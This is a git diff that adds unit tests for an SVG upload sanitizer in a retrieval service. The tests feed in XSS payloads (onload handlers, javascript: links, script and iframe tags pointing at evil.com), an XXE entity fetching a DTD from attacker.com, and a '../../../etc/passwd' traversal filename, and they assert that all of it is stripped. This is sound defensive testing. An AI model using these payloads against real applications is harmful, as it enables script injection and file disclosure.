@@ -1,6 +1,7 @@
 import { describe, it, expect } from 'vitest';
 import { DoclingParser } from '../src/docling-parser.js';
 import { RetrievalService } from '../src/retrieval-service.js';
+import { sanitizeUntrustedUpload } from '../src/upload-sanitizer.js';
 import type { RequestContext } from '@hawa/contracts';
 
 describe('Retrieval: Ingestion & Client-Locked Search', () => {
@@ -110,6 +111,61 @@ describe('Retrieval: Ingestion & Client-Locked Search', () => {
     if (res.ok) {
       expect(res.value.evidence.some((c) => c.id === 'ex-pos')).toBe(true);
       expect(res.value.negativeEvidence.some((c) => c.id === 'ex-neg')).toBe(true);
+    }
+  });
+
+  it('sanitizeUntrustedUpload: strips dangerous tags, handlers, unquoted schemes, and inline style XSS', () => {
+    const maliciousSvg = '<svg/onload=alert(1)><foreignObject><iframe src="http://evil.com"></iframe></foreignObject><a href=javascript:alert(2)><text>click</text></a><circle style="background:url(javascript:alert(3))" /></svg>';
+
+    const res = sanitizeUntrustedUpload({
+      filename: 'asset.svg',
+      mimeType: 'image/svg+xml',
+      content: maliciousSvg,
+    });
+
+    expect(res.ok).toBe(true);
+    if (res.ok) {
+      const sanitized = res.value.sanitizedContent.toString('utf8');
+      expect(sanitized).not.toContain('onload');
+      expect(sanitized).not.toContain('foreignObject');
+      expect(sanitized).not.toContain('iframe');
+      expect(sanitized).not.toContain('javascript:alert');
+      expect(sanitized).not.toContain('background:url');
+      expect(res.value.warnings.length).toBeGreaterThan(0);
+    }
+  });
+
+  it('sanitizeUntrustedUpload: neutralizes slash-delimited script tags and multiline DOCTYPE DTD expansions', () => {
+    const maliciousSvg = '<svg><script/src="http://evil.com/xss.js"></script><text>logo</text></svg>';
+    const res = sanitizeUntrustedUpload({
+      filename: 'exploit.svg',
+      mimeType: 'image/svg+xml',
+      content: maliciousSvg,
+    });
+
+    expect(res.ok).toBe(true);
+    if (res.ok) {
+      const sanitized = res.value.sanitizedContent.toString('utf8');
+      expect(sanitized).not.toContain('script');
+      expect(sanitized).not.toContain('evil.com');
+      expect(res.value.warnings.length).toBeGreaterThan(0);
+    }
+
+    const xxeSvg = '<!DOCTYPE svg [\n  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">\n  %remote;\n]>\n<svg><text>hello</text></svg>';
+    const xxeRes = sanitizeUntrustedUpload({
+      filename: '../../../etc/passwd',
+      mimeType: 'image/svg+xml',
+      content: xxeSvg,
+    });
+
+    expect(xxeRes.ok).toBe(true);
+    if (xxeRes.ok) {
+      const sanitized = xxeRes.value.sanitizedContent.toString('utf8');
+      expect(sanitized).not.toContain('<!DOCTYPE');
+      expect(sanitized).not.toContain('%remote;');
+      expect(sanitized).not.toContain(']>');
+      // Filename path traversal stripped
+      expect(xxeRes.value.filename).toBe('passwd');
     }
   });
 });
